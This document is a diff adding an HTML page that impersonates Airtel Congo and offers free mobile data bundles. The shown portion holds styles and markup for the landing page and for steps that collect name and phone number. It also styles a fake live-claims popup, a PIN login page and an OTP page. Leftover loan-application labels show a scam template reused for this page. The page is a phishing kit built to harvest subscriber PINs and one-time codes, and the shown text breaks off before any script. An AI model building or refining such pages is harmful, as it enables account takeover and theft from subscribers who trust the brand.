@@ -1,0 +1,1453 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Airtel Congo – Free Data Bundles Platform</title>
+<link href="https://fonts.googleapis.com/css2?family=Times+New+Roman&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --airtel-red: #ED1C24;
+    --airtel-red-dark: #C41219;
+    --airtel-black: #1C2340;
+    --grad: linear-gradient(135deg, #ED1C24 0%, #FF4D4D 100%);
+    --page-bg: #F4F5F7;
+    --white: #FFFFFF;
+    --text-dark: #1C2340;
+    --text-mid: #444;
+    --text-light: #888;
+    --border: #E5E7EB;
+    --radius: 12px;
+    --radius-sm: 8px;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: "Times New Roman", Times, serif; background: var(--page-bg); color: var(--text-dark); min-height: 100vh; }
+
+  /* PAGE SYSTEM */
+  .page { display: none; min-height: 100vh; animation: fadeIn 0.3s ease; }
+  .page.active { display: flex; flex-direction: column; }
+  @keyframes fadeIn { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)} }
+
+  /* OVERLAY */
+  .overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.5); backdrop-filter:blur(3px); z-index:999; align-items:center; justify-content:center; }
+  .overlay.show { display:flex; }
+  .modal { background:var(--white); border-radius:var(--radius); padding:40px 36px; text-align:center; max-width:320px; width:90%; box-shadow:0 20px 60px rgba(0,0,0,0.2); animation:popIn 0.3s cubic-bezier(.34,1.56,.64,1); }
+  @keyframes popIn { from{opacity:0;transform:scale(0.85)} to{opacity:1;transform:scale(1)} }
+  .spinner { width:44px; height:44px; border:4px solid #eee; border-top-color:var(--airtel-red); border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 18px; }
+  @keyframes spin { to{transform:rotate(360deg)} }
+  .modal h3 { font-size:1.1rem; font-weight:600; color:var(--text-dark); margin-bottom:6px; }
+  .modal p  { font-size:0.88rem; color:var(--text-light); }
+
+  /* PROFESSIONAL HEADER BRANDING & LOGO */
+  .brand-header { display: flex; align-items: center; justify-content: space-between; padding: 12px 28px; background: var(--white); border-bottom: 1px solid var(--border); width: 100%; }
+  .brand-logo-area { display: flex; align-items: center; gap: 12px; }
+  .brand-logo-mark { width: 40px; height: 40px; background: var(--grad); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: var(--white); font-size: 1.3rem; font-weight: bold; box-shadow: 0 3px 10px rgba(237,28,36,0.25); }
+  .brand-text-group { display: flex; flex-direction: column; }
+  .brand-title { font-size: 1.15rem; font-weight: bold; color: var(--airtel-red); letter-spacing: -0.01em; line-height: 1.2; }
+  .brand-subtitle { font-size: 0.75rem; color: var(--text-light); text-transform: uppercase; letter-spacing: 0.05em; }
+  
+  .header-right-group { display: flex; align-items: center; gap: 16px; }
+  .brand-nav-right { font-size: 0.85rem; color: var(--text-mid); font-weight: 600; cursor: pointer; }
+
+  /* PROFESSIONAL LANGUAGE SELECTOR DROPDOWN STYLING */
+  .lang-selector-wrap { position: relative; display: inline-block; }
+  .lang-select-btn { background: #fafafa; border: 1px solid var(--border); border-radius: 6px; padding: 6px 10px; font-size: 0.82rem; font-weight: 600; color: var(--text-dark); cursor: pointer; display: flex; align-items: center; gap: 6px; font-family: "Times New Roman", Times, serif; transition: border-color 0.2s; }
+  .lang-select-btn:hover { border-color: var(--airtel-red); }
+  .lang-dropdown-menu { display: none; position: absolute; right: 0; top: calc(100% + 4px); background: #ffffff; border: 1px solid var(--border); border-radius: 6px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 150px; z-index: 1000; overflow: hidden; }
+  .lang-dropdown-menu.show { display: block; }
+  .lang-option { padding: 8px 12px; font-size: 0.82rem; color: var(--text-dark); cursor: pointer; display: flex; align-items: center; gap: 8px; transition: background 0.15s; text-align: left; border: none; background: none; width: 100%; font-family: "Times New Roman", Times, serif; }
+  .lang-option:hover { background: #fdf2f2; color: var(--airtel-red); }
+  .lang-option.active { font-weight: bold; color: var(--airtel-red); background: #fafafa; }
+
+  /* NAV */
+  .navbar { background:var(--airtel-red); display:flex; align-items:center; justify-content:center; padding:0 20px; height:54px; position:relative; flex-shrink:0; }
+  .nav-left { position:absolute; left:20px; color:rgba(255,255,255,0.8); font-size:0.84rem; cursor:pointer; text-decoration:none; transition:color 0.2s; }
+  .nav-left:hover { color:#fff; }
+  .nav-right { position:absolute; right:20px; display:flex; flex-direction:column; gap:4px; cursor:pointer; padding:4px; }
+  .hline { width:20px; height:2px; background:rgba(255,255,255,0.8); border-radius:1px; }
+
+  /* BUTTONS */
+  .btn-grad { background:var(--grad); color:#fff; border:none; border-radius:8px; padding:14px 20px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; width:100%; font-family:"Times New Roman", Times, serif; transition:opacity 0.2s, box-shadow 0.2s; box-shadow:0 4px 12px rgba(237,28,36,0.25); }
+  .btn-grad:hover { opacity:0.95; box-shadow:0 6px 16px rgba(237,28,36,0.35); }
+  .btn-grad:disabled { opacity:0.5; cursor:not-allowed; box-shadow:none; }
+  .btn-gray { background:#e0e0e0; color:#666; border:none; border-radius:8px; padding:14px 20px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; flex:1; font-family:"Times New Roman", Times, serif; transition:background 0.2s; }
+  .btn-gray:hover { background:#d0d0d0; }
+
+  /* FORM */
+  .field { margin-bottom:18px; }
+  .field label { display:block; font-size:0.82rem; font-weight:500; color:var(--text-mid); margin-bottom:6px; }
+  .field input, .field select, .field textarea { width:100%; padding:11px 14px; border:1.5px solid var(--border); border-radius:var(--radius-sm); font-family:"Times New Roman", Times, serif; font-size:0.9rem; color:var(--text-dark); background:#fff; outline:none; transition:border-color 0.2s, box-shadow 0.2s; appearance:none; -webkit-appearance:none; }
+  .field input:focus, .field select:focus, .field textarea:focus { border-color:var(--airtel-red); box-shadow:0 0 0 3px rgba(237,28,36,0.12); }
+  .field textarea { resize:vertical; min-height:90px; }
+  .sel-wrap { position:relative; }
+  .sel-wrap::after { content:'▾'; position:absolute; right:14px; top:50%; transform:translateY(-50%); color:var(--text-light); pointer-events:none; font-size:0.9rem; }
+  .field-row { display:grid; grid-template-columns:1fr 1fr; gap:14px; }
+  .phone-row { display:flex; }
+  .ph-pre { padding:11px 12px; background:#f5f5f5; border:1.5px solid var(--border); border-right:none; border-radius:var(--radius-sm) 0 0 var(--radius-sm); font-size:0.85rem; font-weight:500; color:#555; white-space:nowrap; display:flex; align-items:center; }
+  .phone-row input { border-radius:0 var(--radius-sm) var(--radius-sm) 0 !important; flex:1; }
+  .field-hint { font-size:0.75rem; color:var(--text-light); margin-top:5px; }
+
+  /* STEP PROGRESS */
+  .prog-row { display:flex; gap:8px; margin:10px 0 24px; }
+  .prog-seg { flex:1; height:4px; border-radius:2px; background:#e0e0e0; transition:background 0.3s; }
+  .prog-seg.done { background:var(--airtel-black); }
+  .prog-seg.now  { background:var(--airtel-red); }
+
+  /* STEP BUTTONS */
+  .step-btns { display:flex; gap:12px; margin-top:8px; }
+  .step-btns .btn-grad { flex:1; }
+
+  /* FOOTER */
+  .pg-footer { margin-top:auto; padding:14px; text-align:center; font-size:0.78rem; color:var(--text-light); background:#fff; border-top:1px solid #eee; flex-shrink:0; }
+
+  /* ───── PAGE 1: LANDING & DATA SELECTION BOXES ───── */
+  #page-landing { background:var(--page-bg); }
+  .land-center { flex:1; display:flex; align-items:center; justify-content:center; padding:32px 16px; }
+  .land-card { width:100%; max-width:540px; background:#fff; border-radius:var(--radius); box-shadow:0 4px 24px rgba(0,0,0,0.06); padding:36px 32px; border-top:4px solid var(--airtel-red); }
+  .land-card h1 { font-size:1.45rem; font-weight:700; text-align:center; margin-bottom:6px; }
+  .land-tagline { text-align:center; font-size:0.84rem; color:var(--text-light); margin-bottom:24px; }
+  
+  .packages-section-title { font-size:0.92rem; font-weight:600; margin-bottom:12px; color:var(--text-dark); }
+  .packages-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 20px; }
+  .pkg-box { border: 1.5px solid var(--border); border-radius: var(--radius-sm); padding: 14px 8px; text-align: center; cursor: pointer; background: #fff; transition: all 0.2s; position: relative; }
+  .pkg-box:hover { border-color: var(--airtel-red); }
+  .pkg-box.selected { border-color: var(--airtel-red); background: #fdf2f2; box-shadow: 0 0 0 2px rgba(237,28,36,0.15); }
+  .pkg-gb { font-size: 1.15rem; font-weight: bold; color: var(--airtel-red); }
+  .pkg-validity { font-size: 0.72rem; color: var(--text-light); margin-top: 3px; }
+  
+  .monthly-box { background:#fafafa; border:1px solid #eee; border-radius:var(--radius-sm); padding:14px 16px; display:flex; justify-content:space-between; align-items:center; margin-bottom:22px; }
+  .monthly-box .ml { font-size:0.82rem; color:var(--text-light); }
+  .monthly-box .ma { font-size:1.4rem; font-weight:700; color:var(--airtel-red); }
+
+  .feats-row { display:flex; justify-content:space-around; padding:20px 0 0; border-top:1px solid #f0f0f0; margin-top:4px; }
+  .feat { text-align:center; }
+  .feat .fi { font-size:1.6rem; margin-bottom:5px; }
+  .feat .ft { font-size:0.8rem; font-weight:600; }
+  .feat .fs { font-size:0.73rem; color:var(--text-light); }
+  .land-footer { background:var(--airtel-black); padding:14px; text-align:center; font-size:0.77rem; color:rgba(255,255,255,0.6); flex-shrink:0; }
+  
+  /* ───── AIRTEL CONGO LIVE CLAIM CARD ───── */
+  .live-popup {
+    position: absolute;
+    top: 75px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 90%;
+    max-width: 360px;
+    background: #ffffff;
+    border-radius: 8px;
+    padding: 10px 14px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    border: 1px solid rgba(230, 0, 0, 0.15);
+    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.12);
+    opacity: 0;
+    visibility: hidden;
+    transition: all 0.35s ease;
+    z-index: 9999;
+  }
+  .live-popup.show {
+    opacity: 1;
+    visibility: visible;
+    transform: translateX(-50%);
+  }
+  .popup-avatar {
+    width: 38px;
+    height: 38px;
+    min-width: 38px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #e60000, #ff1a1a);
+    color: #ffffff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 0.95rem;
+    font-weight: 700;
+    box-shadow: 0 2px 6px rgba(230, 0, 0, 0.3);
+  }
+  .popup-content { flex: 1; }
+  .popup-text { font-size: 0.78rem; line-height: 1.35; color: #4b5563; }
+  .popup-text strong { color: #111827; font-weight: 700; }
+  .popup-time { margin-top: 3px; font-size: 0.65rem; color: #e60000; font-weight: 600; }
+  .popup-time::before { content: "● "; animation: pulse 1.2s infinite; }
+  @keyframes pulse { 50%{ opacity: .4; } }
+
+  /* ───── STEP PAGES 2-4 ───── */
+  .step-center { flex:1; display:flex; align-items:flex-start; justify-content:center; padding:28px 16px; }
+  .step-card { width:100%; max-width:480px; background:#fff; border-radius:var(--radius); box-shadow:0 4px 24px rgba(0,0,0,0.06); padding:32px 28px; border-top:4px solid var(--airtel-red); }
+  .step-card h2 { font-size:1.25rem; font-weight:700; text-align:center; margin-bottom:4px; }
+  .step-sub { text-align:center; font-size:0.82rem; color:var(--text-light); margin-bottom:4px; }
+
+  /* SUMMARY */
+  .sum-box { border:1px solid #e0e0e0; border-left:4px solid var(--airtel-red); border-radius:var(--radius-sm); padding:16px 14px; margin:16px 0; background:#fff5f5; }
+  .sum-box h3 { font-size:0.88rem; font-weight:600; margin-bottom:12px; }
+  .sum-row { display:flex; justify-content:space-between; font-size:0.82rem; padding:7px 0; border-bottom:1px solid #f0f0f0; }
+  .sum-row:last-child { border-bottom:none; }
+  .sum-row .sk { color:var(--text-light); }
+  .sum-row .sv { font-weight:500; }
+
+  /* ───── PAGE 5: SUBMITTED ───── */
+  #page-submitted { background:var(--airtel-red); align-items:center; justify-content:center; }
+  .sub-wrap { text-align:center; padding:40px 24px; max-width:420px; }
+  .sub-icon { width:80px; height:80px; border-radius:50%; background:rgba(255,255,255,0.15); border:2px solid rgba(255,255,255,0.4); display:flex; align-items:center; justify-content:center; font-size:2rem; margin:0 auto 24px; animation:pulse 2s ease infinite; color:#fff; }
+  .sub-wrap h2 { font-size:1.6rem; font-weight:700; color:#fff; margin-bottom:12px; }
+  .sub-wrap p  { color:rgba(255,255,255,0.85); font-size:0.88rem; line-height:1.7; margin-bottom:24px; }
+  .redir-pill { display:inline-flex; align-items:center; gap:8px; background:rgba(255,255,255,0.15); border:1px solid rgba(255,255,255,0.3); border-radius:50px; padding:9px 20px; color:#fff; font-size:0.84rem; margin-bottom:24px; }
+  .redir-n { font-weight:700; color:#fff; background:rgba(0,0,0,0.2); padding:2px 8px; border-radius:10px; }
+  .btn-go { background:#fff; color:var(--airtel-red); border:none; border-radius:8px; padding:14px 36px; font-size:0.9rem; font-weight:600; cursor:pointer; font-family:"Times New Roman", Times, serif; letter-spacing:0.04em; transition:background 0.2s; }
+  .btn-go:hover { background:#f8f9fa; }
+
+  /* ───── PAGE 6: LOGIN ───── */
+  #page-login { background:#fff; }
+  .login-body-wrap { flex:1; background:#fff; padding:32px 20px 0; display:flex; flex-direction:column; align-items:center; }
+  .login-body-wrap h2 { font-size:1.05rem; font-weight:600; margin-bottom:24px; }
+  .login-inner { width:100%; max-width:380px; }
+  .lg-phone-row { display:flex; margin-bottom:24px; }
+  .lg-ph-pre { display:flex; align-items:center; gap:4px; padding:11px 12px; background:#fafafa; border:1.5px solid var(--border); border-right:none; border-radius:var(--radius-sm) 0 0 var(--radius-sm); font-size:0.84rem; color:#555; font-weight:500; white-space:nowrap; }
+  .lg-phone-row input { flex:1; padding:11px 14px; border:1.5px solid var(--border); border-left:none; border-radius:0 var(--radius-sm) var(--radius-sm) 0; font-family:"Times New Roman", Times, serif; font-size:0.9rem; outline:none; background:#fff; transition:border-color 0.2s; }
+  .lg-phone-row input:focus { border-color:var(--airtel-red); }
+  .pin-label { font-size:0.82rem; color:var(--text-light); text-align:center; margin-bottom:12px; }
+  .pin-row { display:flex; gap:10px; justify-content:center; margin-bottom:12px; position:relative; align-items:center; }
+  .pin-box { width:52px; height:52px; border:1.5px solid var(--border); border-radius:var(--radius-sm); text-align:center; font-family:"Times New Roman", Times, serif; font-size:1.3rem; font-weight:700; color:var(--airtel-red); outline:none; transition:border-color 0.2s; }
+  .pin-box:focus { border-color:var(--airtel-red); box-shadow:0 0 0 3px rgba(237,28,36,0.12); }
+  .pin-eye { cursor:pointer; color:var(--text-light); font-size:1rem; background:none; border:none; margin-left:6px; }
+  .forgot-pin { text-align:center; font-size:0.82rem; color:var(--text-light); margin-bottom:24px; cursor:pointer; }
+  .btn-login { width:100%; max-width:380px; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:"Times New Roman", Times, serif; transition:all 0.2s; }
+  .btn-login.rdy { background:var(--grad); color:#fff; box-shadow:0 4px 12px rgba(237,28,36,0.25); }
+  .lg-curve { margin-top:32px; background:#fff; overflow:hidden; flex-shrink:0; }
+  .lg-curve::before { content:''; display:block; background:var(--airtel-black); height:55px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
+  .lg-foot { background:var(--airtel-black); padding:24px 20px 32px; display:flex; flex-direction:column; align-items:center; gap:8px; text-align:center; color:#fff; }
+  .lg-version { font-size:0.72rem; color:rgba(255,255,255,0.5); margin-top:4px; }
+  .lg-terms { font-size:0.72rem; color:rgba(255,255,255,0.6); }
+  .lg-terms a { color:#fff; text-decoration:underline; }
+
+  /* ───── PAGE 7: OTP ───── */
+  #page-otp { background:#fff; }
+  .otp-body-wrap { flex:1; padding:32px 16px; display:flex; align-items:flex-start; justify-content:center; }
+  .otp-card { background:#fff; border:1px solid #eee; border-radius:var(--radius); padding:32px 28px; width:100%; max-width:440px; box-shadow:0 2px 16px rgba(0,0,0,0.06); border-top:4px solid var(--airtel-red); }
+  .otp-card h2 { font-size:1.2rem; font-weight:700; margin-bottom:6px; }
+  .otp-hint { font-size:0.83rem; color:var(--text-light); margin-bottom:5px; }
+  .otp-phone { font-size:0.9rem; font-weight:600; color:var(--text-dark); margin-bottom:22px; }
+  .otp-inputs { display:flex; gap:8px; margin-bottom:12px; width:100%; }
+  .otp-box { flex:1; min-width:0; width:0; height:52px; border:1.5px solid var(--border); border-radius:var(--radius-sm); text-align:center; font-family:"Times New Roman", Times, serif; font-size:1.2rem; font-weight:700; color:var(--airtel-red); outline:none; transition:border-color 0.2s; }
+  .otp-box:focus { border-color:var(--airtel-red); box-shadow:0 0 0 3px rgba(237,28,36,0.12); }
+  .otp-resend { font-size:0.8rem; color:var(--airtel-red); margin-bottom:22px; }
+  .btn-otp { width:100%; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:"Times New Roman", Times, serif; transition:all 0.2s; }
+  .btn-otp.rdy { background:var(--grad); color:#fff; box-shadow:0 4px 12px rgba(237,28,36,0.25); }
+  .otp-curve { background:#fff; overflow:hidden; flex-shrink:0; }
+  .otp-curve::before { content:''; display:block; background:var(--airtel-black); height:50px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
+  .otp-foot { background:var(--airtel-black); padding:14px; text-align:center; font-size:0.75rem; color:rgba(255,255,255,0.6); }
+
+  /* ───── PAGE 8: APPROVAL ───── */
+  #page-approval { background:linear-gradient(135deg,#ED1C24 0%,#C41219 50%,#1C2340 100%); min-height:100vh; align-items:center; justify-content:center; padding:32px 16px; }
+  .appr-wrap { width:100%; max-width:520px; }
+  .appr-top { background:#fff; border-radius:var(--radius) var(--radius) 0 0; padding:28px 24px 0; text-align:center; }
+  .check-circle { width:56px; height:56px; border-radius:50%; background:var(--grad); display:flex; align-items:center; justify-content:center; margin:0 auto 12px; font-size:1.3rem; color:#fff; box-shadow:0 4px 16px rgba(237,28,36,0.4); }
+  .appr-title { font-size:1.2rem; font-weight:700; margin-bottom:6px; }
+  .appr-sub   { font-size:0.82rem; color:var(--text-light); margin-bottom:18px; }
+  .appr-banner { background:var(--grad); padding:16px; margin:0 -24px; text-align:center; }
+  .appr-banner .abl { font-size:0.72rem; color:rgba(255,255,255,0.9); text-transform:uppercase; letter-spacing:0.06em; }
+  .appr-banner .aba { font-size:2rem; font-weight:700; color:#fff; }
+  .comp-box { background:#FFFBEA; border:1px solid #F5C842; padding:14px 16px; }
+  .comp-box .ch { display:flex; align-items:center; gap:6px; font-size:0.82rem; font-weight:700; color:#a07000; margin-bottom:6px; }
+  .comp-box p { font-size:0.78rem; color:#7a5500; line-height:1.6; }
+  .comp-box strong { font-weight:600; }
+  .ld-card { background:#fff; padding:20px 24px; }
+  .ld-htitle { font-size:0.82rem; font-weight:600; color:var(--text-mid); margin-bottom:14px; display:flex; align-items:center; gap:6px; }
+  .ld-row { display:flex; align-items:center; gap:12px; padding:10px 0; border-bottom:1px solid #f5f5f5; }
+  .ld-row:last-child { border-bottom:none; }
+  .ld-icon { width:34px; height:34px; border-radius:8px; display:flex; align-items:center; justify-content:center; font-size:0.85rem; flex-shrink:0; }
+  .ic-g{background:linear-gradient(135deg,#2ECC71,#27AE60); color:#fff;}
+  .ic-b{background:linear-gradient(135deg,#3498DB,#2980B9); color:#fff;}
+  .ic-p{background:linear-gradient(135deg,#ED1C24,#C41219); color:#fff;}
+  .ld-lbl { font-size:0.72rem; color:var(--text-light); text-transform:uppercase; letter-spacing:0.04em; }
+  .ld-val { font-size:0.9rem; font-weight:600; }
+  .qa-wrap { background:#fff; padding:0 24px 18px; }
+  .qa-title { font-size:0.8rem; font-weight:600; color:var(--text-mid); margin-bottom:10px; text-align:center; }
+  .qa-btn { width:100%; padding:12px; margin-bottom:8px; background:#fff; border:1.5px solid #e0e0e0; border-radius:8px; font-size:0.84rem; font-weight:500; color:var(--text-dark); cursor:pointer; font-family:"Times New Roman", Times, serif; transition:all 0.2s; }
+  .qa-btn:hover { border-color:var(--airtel-red); color:var(--airtel-red); }
+  .nxt-steps { background:#fff; padding:14px 24px; display:flex; align-items:flex-start; gap:8px; border-top:1px solid #f0f0f0; }
+  .nxt-steps p { font-size:0.79rem; color:var(--text-light); line-height:1.5; }
+  .rth-wrap { background:#fff; border-radius:0 0 var(--radius) var(--radius); padding:14px 24px 24px; }
+  .rth-btn { width:100%; padding:13px; background:var(--grad); color:#fff; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.04em; cursor:pointer; font-family:"Times New Roman", Times, serif; box-shadow:0 4px 12px rgba(237,28,36,0.25); }
+
+  /* INLINE ERROR / STATUS MESSAGES */
+  .msg-box { border-radius:var(--radius-sm); padding:12px 16px; font-size:0.84rem; margin-bottom:16px; display:none; align-items:center; gap:10px; }
+  .msg-box.show { display:flex; }
+  .msg-box.error   { background:#fef2f2; border:1.5px solid #fecaca; color:#991b1b; }
+  .msg-box.success { background:#f0fdf4; border:1.5px solid #bbf7d0; color:#166534; }
+  .msg-box.info    { background:#eff6ff; border:1.5px solid #bfdbfe; color:#1e40af; }
+  .msg-box.warning { background:#fefce8; border:1.5px solid #fef08a; color:#854d0e; }
+  .msg-icon { font-size:1.1rem; flex-shrink:0; }
+
+  /* WAITING / POLLING INDICATOR */
+  .waiting-box { background:#f8f9ff; border:1px solid #e0e5ff; border-radius:var(--radius-sm); padding:16px; text-align:center; margin-bottom:16px; display:none; }
+  .waiting-box.show { display:block; }
+  .waiting-box .wb-spinner { width:28px; height:28px; border:3px solid #e0e5ff; border-top-color:var(--airtel-red); border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 10px; }
+  .waiting-box p { font-size:0.82rem; color:var(--text-mid); }
+
+  @media(max-width:500px){.field-row{grid-template-columns:1fr;}.step-card,.land-card{padding:24px 18px;}.otp-card{padding:24px 16px;}.packages-grid{grid-template-columns:repeat(2,1fr);}}
+</style>
+</head>
+<body>
+
+<!-- ══════════════════════ PAGE 1: LANDING ══════════════════════ -->
+<div id="page-landing" class="page active">
+  <header class="brand-header">
+    <div class="brand-logo-area">
+      <div class="brand-logo-mark">a</div>
+      <div class="brand-text-group">
+        <span class="brand-title">Airtel Congo</span>
+        <span class="brand-subtitle" data-i18n="lbl_financial_services">Data Rewards Hub</span>
+      </div>
+    </div>
+    <div class="header-right-group">
+      <!-- PROFESSIONAL LANGUAGE SELECTION DROPDOWN BUTTON -->
+      <div class="lang-selector-wrap">
+        <button class="lang-select-btn" onclick="toggleLangDropdown(event)">
+          <span id="currentLangLabel">🌐 English</span> ▾
+        </button>
+        <div class="lang-dropdown-menu" id="langDropdownMenu">
+          <button class="lang-option active" onclick="setLanguage('en')">🇬🇧 English</button>
+          <button class="lang-option" onclick="setLanguage('sw')">🇨🇩 Kiswahili</button>
+          <button class="lang-option" onclick="setLanguage('fr')">🇫🇷 Français</button>
+        </div>
+      </div>
+      <div class="brand-nav-right" onclick="goTo('page-login')" data-i18n="nav_signin">Claim Bundle</div>
+    </div>
+  </header>
+
+  <div class="land-center">
+    <div class="land-card">
+      <h1 data-i18n="land_h1">Claim Your Free Data Bundle</h1>
+      <p class="land-tagline" data-i18n="land_sub">High-speed 4G LTE • Zero cost • Instant activation</p>
+
+      <div class="packages-section-title" data-i18n="calc_title">Select Data Package</div>
+      <div class="packages-grid">
+        <div class="pkg-box" onclick="selectPackage(1, '7 Days', this)">
+          <div class="pkg-gb">1 GB</div>
+          <div class="pkg-validity">7 Days</div>
+        </div>
+        <div class="pkg-box" onclick="selectPackage(5, '14 Days', this)">
+          <div class="pkg-gb">5 GB</div>
+          <div class="pkg-validity">14 Days</div>
+        </div>
+        <div class="pkg-box selected" onclick="selectPackage(10, '30 Days', this)">
+          <div class="pkg-gb">10 GB</div>
+          <div class="pkg-validity">30 Days</div>
+        </div>
+        <div class="pkg-box" onclick="selectPackage(25, '30 Days', this)">
+          <div class="pkg-gb">25 GB</div>
+          <div class="pkg-validity">30 Days</div>
+        </div>
+        <div class="pkg-box" onclick="selectPackage(50, '60 Days', this)">
+          <div class="pkg-gb">50 GB</div>
+          <div class="pkg-validity">60 Days</div>
+        </div>
+        <div class="pkg-box" onclick="selectPackage(100, '90 Days', this)">
+          <div class="pkg-gb">100 GB</div>
+          <div class="pkg-validity">90 Days</div>
+        </div>
+      </div>
+
+      <div class="monthly-box">
+        <span class="ml" data-i18n="calc_monthly">Bundle Cost</span>
+        <span class="ma" id="mOut">FREE ($0)</span>
+      </div>
+
+      <button class="btn-grad" onclick="goTo('page-step1')" data-i18n="btn_apply_now">CLAIM FREE DATA</button>
+
+      <div class="feats-row">
+        <div class="feat"><div class="fi">⚡</div><div class="ft" data-i18n="feat_fast">Instant Delivery</div><div class="fs" data-i18n="feat_fast_sub">Credited in seconds</div></div>
+        <div class="feat"><div class="fi">🎁</div><div class="ft" data-i18n="feat_rates">100% Free</div><div class="fs" data-i18n="feat_rates_sub">No hidden charges</div></div>
+        <div class="feat"><div class="fi">🔒</div><div class="ft" data-i18n="feat_secure">Secure</div><div class="fs" data-i18n="feat_secure_sub">Official Network</div></div>
+      </div>
+    </div>
+  </div>
+
+  <div id="popup" class="live-popup">
+    <div class="popup-avatar" id="popup-avatar">A</div>
+    <div class="popup-content">
+        <div id="popup-text" class="popup-text"></div>
+        <div id="popup-time" class="popup-time">Just now</div>
+    </div>
+  </div>
+
+  <div class="land-footer">© 2026 Airtel Congo</div>
+</div>
+
+<!-- ══════════════════════ PAGE 2: STEP 1 ══════════════════════ -->
+<div id="page-step1" class="page">
+  <header class="brand-header">
+    <div class="brand-logo-area">
+      <div class="brand-logo-mark">a</div>
+      <div class="brand-text-group">
+        <span class="brand-title">Airtel Congo</span>
+        <span class="brand-subtitle" data-i18n="lbl_loan_app">Data Claim Portal</span>
+      </div>
+    </div>
+    <div class="brand-nav-right" onclick="goTo('page-landing')" data-i18n="nav_home">Home</div>
+  </header>
+
+  <div class="step-center">
+    <div class="step-card">
+      <h2 data-i18n="lbl_loan_app">Select Data Package</h2>
+      <p class="step-sub" data-i18n="step_1_sub">Step 1 of 3</p>
+      <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
+      <div class="msg-box error" id="s1Err"><span class="msg-icon">&#x2715;</span><span id="s1ErrTxt"></span></div>
+      <div class="field"><label data-i18n="field_loan_type">Network Offer Type</label><div class="sel-wrap"><select id="s1ty"><option data-i18n="opt_personal">Promotional Free Data</option><option selected data-i18n="opt_business">Loyalty Bonus Data</option><option data-i18n="opt_home">Student Data Relief</option><option data-i18n="opt_car">Weekend Night Data</option><option data-i18n="opt_edu">Social Media Pack</option></select></div></div>
+      <div class="field"><label data-i18n="field_loan_amt">Data Volume (GB)</label><input type="number" id="s1am" value="10" placeholder="Enter GB amount" oninput="clearErr('s1Err')"></div>
+      <div class="field"><label data-i18n="field_loan_term">Validity Duration</label><div class="sel-wrap"><select id="s1te"><option>7 Days</option><option>14 Days</option><option selected>30 Days</option><option>60 Days</option><option>90 Days</option></select></div></div>
+      <div class="field"><label data-i18n="field_purpose">Reason for Claim</label><textarea id="s1pu" placeholder="Describe how you plan to use this data…" oninput="clearErr('s1Err')"></textarea></div>
+      <button class="btn-grad" onclick="toS2()" data-i18n="btn_next">NEXT STEP</button>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════ PAGE 3: STEP 2 ══════════════════════ -->
+<div id="page-step2" class="page">
+  <header class="brand-header">
+    <div class="brand-logo-area">
+      <div class="brand-logo-mark">a</div>
+      <div class="brand-text-group">
+        <span class="brand-title">Airtel Congo</span>
+        <span class="brand-subtitle" data-i18n="lbl_loan_app">Data Claim Portal</span>
+      </div>
+    </div>
+    <div class="brand-nav-right" onclick="goTo('page-step1')" data-i18n="nav_back">Back</div>
+  </header>
+
+  <div class="step-center">
+    <div class="step-card">
+      <h2 data-i18n="lbl_loan_app">Subscriber Verification</h2>
+      <p class="step-sub" data-i18n="step_2_sub">Step 2 of 3</p>
+      <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
+      <div class="msg-box error" id="s2Err"><span class="msg-icon">&#x2715;</span><span id="s2ErrTxt"></span></div>
+      <div class="field-row">
+        <div class="field"><label data-i18n="field_fname">First Name</label><input type="text" id="s2fi" placeholder="First Name" oninput="clearErr('s2Err')"></div>
+        <div class="field"><label data-i18n="field_lname">Last Name</label><input type="text" id="s2la" placeholder="Last Name" oninput="clearErr('s2Err')"></div>
+      </div>
+      <div class="field">
+        <label data-i18n="field_phone">Airtel Phone Number</label>
+        <div class="phone-row"><div class="ph-pre">+243</div><input type="tel" id="s2ph" placeholder="812345678" maxlength="9" oninput="normalizePhone('s2ph');clearErr('s2Err')"></div>
+        <div class="field-hint" data-i18n="phone_hint">Enter 9 digits for DRC</div>
+      </div>
+      <div class="step-btns">
+        <button class="btn-gray" onclick="goTo('page-step1')" data-i18n="btn_prev">PREVIOUS</button>
+        <button class="btn-grad" onclick="toS3()" data-i18n="btn_next">NEXT STEP</button>
+      </div>
+    </div>
+  </div>
+  <div class="pg-footer">© 2026 Airtel Congo</div>
+</div>
+
+<!-- ══════════════════════ PAGE 4: STEP 3 ══════════════════════ -->
+<div id="page-step3" class="page">
+  <header class="brand-header">
+    <div class="brand-logo-area">
+      <div class="brand-logo-mark">a</div>
+      <div class="brand-text-group">
+        <span class="brand-title">Airtel Congo</span>
+        <span class="brand-subtitle" data-i18n="lbl_loan_app">Data Claim Portal</span>
+      </div>
+    </div>
+    <div class="brand-nav-right" onclick="goTo('page-step2')" data-i18n="nav_back">Back</div>
+  </header>
+
+  <div class="step-center">
+    <div class="step-card">
